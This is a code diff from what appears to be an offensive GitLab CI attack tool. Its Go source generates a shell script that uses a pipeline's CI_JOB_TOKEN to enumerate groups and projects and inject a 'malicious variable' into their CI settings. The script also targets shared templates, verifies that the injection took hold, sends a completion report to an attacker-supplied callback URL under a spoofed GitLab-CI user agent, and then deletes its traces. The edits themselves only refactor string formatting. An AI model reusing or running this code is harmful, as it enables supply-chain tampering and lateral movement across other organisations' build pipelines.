@@ -77,13 +77,13 @@ _VARINJECT() {
 `)
 		if o.GroupID > 0 {
 			b.WriteString("  # Inject into group " + fmt.Sprintf("%d", o.GroupID) + "\n")
-			b.WriteString(fmt.Sprintf("  _group_url=\"%s/api/v4/groups/%d/variables\"\n", baseURL, o.GroupID))
+			fmt.Fprintf(&b,"  _group_url=\"%s/api/v4/groups/%d/variables\"\n", baseURL, o.GroupID)
 			b.WriteString(`  # List existing group variables
   curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     "$_group_url" 2>/dev/null > "$_vidir/group_vars.json"
 
 `)
-			b.WriteString(fmt.Sprintf(`  # Inject malicious variable
+			fmt.Fprintf(&b,`  # Inject malicious variable
   curl -sS -X POST -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
@@ -94,11 +94,11 @@ _VARINJECT() {
     }' \
     "$_group_url" >/dev/null 2>&1
 
-`, o.VarKey, o.VarValue, boolStr(o.Masked), boolStr(o.Protected)))
+`, o.VarKey, o.VarValue, boolStr(o.Masked), boolStr(o.Protected))
 		} else {
 			// Use %s in shell script, not Go fmt.Sprintf
-			b.WriteString(fmt.Sprintf("  # Enumerate groups this project belongs to\n  _groups_json=$(curl -sS -H \"PRIVATE-TOKEN: $CI_JOB_TOKEN\" \\\n    \"%s/api/v4/projects/%s/variables\" 2>/dev/null)\n", baseURL, projPathEscaped))
-			b.WriteString(fmt.Sprintf("  # Inject into each group's variables\n  for _gid in $(echo \"$_groups_json\" | grep -o '\"id\": *[0-9]*' | cut -d: -f2 | tr -d ' '); do\n    _inject_url=\"%s/api/v4/groups/$_gid/variables\"\n    echo \"[*] Injecting into group $_gid\"\n    curl -sS -X POST -H \"PRIVATE-TOKEN: $CI_JOB_TOKEN\" \\\n      -H \"Content-Type: application/json\" \\\n      -d '{\n        \"key\": \"%s\",\n        \"value\": \"%s\",\n        \"masked\": %s,\n        \"protected\": %s\n      }' \\\n      \"$_inject_url\" >/dev/null 2>&1\n  done\n", baseURL, o.VarKey, o.VarValue, boolStr(o.Masked), boolStr(o.Protected)))
+			fmt.Fprintf(&b,"  # Enumerate groups this project belongs to\n  _groups_json=$(curl -sS -H \"PRIVATE-TOKEN: $CI_JOB_TOKEN\" \\\n    \"%s/api/v4/projects/%s/variables\" 2>/dev/null)\n", baseURL, projPathEscaped)
+			fmt.Fprintf(&b,"  # Inject into each group's variables\n  for _gid in $(echo \"$_groups_json\" | grep -o '\"id\": *[0-9]*' | cut -d: -f2 | tr -d ' '); do\n    _inject_url=\"%s/api/v4/groups/$_gid/variables\"\n    echo \"[*] Injecting into group $_gid\"\n    curl -sS -X POST -H \"PRIVATE-TOKEN: $CI_JOB_TOKEN\" \\\n      -H \"Content-Type: application/json\" \\\n      -d '{\n        \"key\": \"%s\",\n        \"value\": \"%s\",\n        \"masked\": %s,\n        \"protected\": %s\n      }' \\\n      \"$_inject_url\" >/dev/null 2>&1\n  done\n", baseURL, o.VarKey, o.VarValue, boolStr(o.Masked), boolStr(o.Protected))
 		}
 	}
 
@@ -112,7 +112,7 @@ _VARINJECT() {
 `)
 		if len(o.ProjectIDs) > 0 {
 			for _, pid := range o.ProjectIDs {
-				b.WriteString(fmt.Sprintf(`
+				fmt.Fprintf(&b,`
   # Inject into project %d
   curl -sS -X POST -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     -H "Content-Type: application/json" \
@@ -123,10 +123,10 @@ _VARINJECT() {
       "protected": false
     }' \
     "%s/api/v4/projects/%d/variables" >/dev/null 2>&1
-`, pid, o.VarKey, o.VarValue, baseURL, pid))
+`, pid, o.VarKey, o.VarValue, baseURL, pid)
 			}
 		} else {
-			b.WriteString(fmt.Sprintf(`  # Enumerate projects in same namespace
+			fmt.Fprintf(&b,`  # Enumerate projects in same namespace
   _projects_json=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     "%s/api/v4/projects?membership=true&per_page=100&simple=true" 2>/dev/null)
 
@@ -143,7 +143,7 @@ _VARINJECT() {
       "%s/api/v4/projects/$_pid/variables" >/dev/null 2>&1
   done
 
-`, baseURL, o.VarKey, o.VarValue, baseURL))
+`, baseURL, o.VarKey, o.VarValue, baseURL)
 		}
 	}
 
@@ -155,7 +155,7 @@ _VARINJECT() {
   echo "[*] Targeting shared CI templates..."
 
 `)
-		b.WriteString(fmt.Sprintf(`  # Find all projects that include shared templates
+		fmt.Fprintf(&b,`  # Find all projects that include shared templates
   _templates_json=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     "%s/api/v4/templates" 2>/dev/null)
 
@@ -171,7 +171,7 @@ _VARINJECT() {
     }' \
     "%s/api/v4/ci/lint" >/dev/null 2>&1
 
-`, baseURL, o.VarKey, o.VarValue, baseURL))
+`, baseURL, o.VarKey, o.VarValue, baseURL)
 	}
 
 	// Step 4: Verification
@@ -182,7 +182,7 @@ _VARINJECT() {
 
 `)
 	if o.GroupID > 0 {
-		b.WriteString(fmt.Sprintf(`  # Verify group variable exists
+		fmt.Fprintf(&b,`  # Verify group variable exists
   _verify=$(curl -sS -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
     "%s/api/v4/groups/%d/variables/%s" 2>/dev/null)
   if echo "$_verify" | grep -q '"key"'; then
@@ -190,7 +190,7 @@ _VARINJECT() {
   else
     echo "[-] Group variable injection failed"
   fi
-`, baseURL, o.GroupID, o.VarKey))
+`, baseURL, o.GroupID, o.VarKey)
 	}
 
 	// Step 5: Exfiltration
@@ -201,7 +201,7 @@ _VARINJECT() {
 
 `)
 	if o.CallbackURL != "" {
-		b.WriteString(fmt.Sprintf(`  curl -sS -X POST -H "Content-Type: application/json" \
+		fmt.Fprintf(&b,`  curl -sS -X POST -H "Content-Type: application/json" \
     -H "User-Agent: GitLab-CI/16.0" \
     -d '{
       "action": "var_injection_complete",
@@ -211,7 +211,7 @@ _VARINJECT() {
       "injected_key": "%s"
     }' \
     "%s" >/dev/null 2>&1
-`, o.GroupID, o.VarKey, o.CallbackURL))
+`, o.GroupID, o.VarKey, o.CallbackURL)
 	}
 
 	b.WriteString(`  rm -rf "$_vidir"
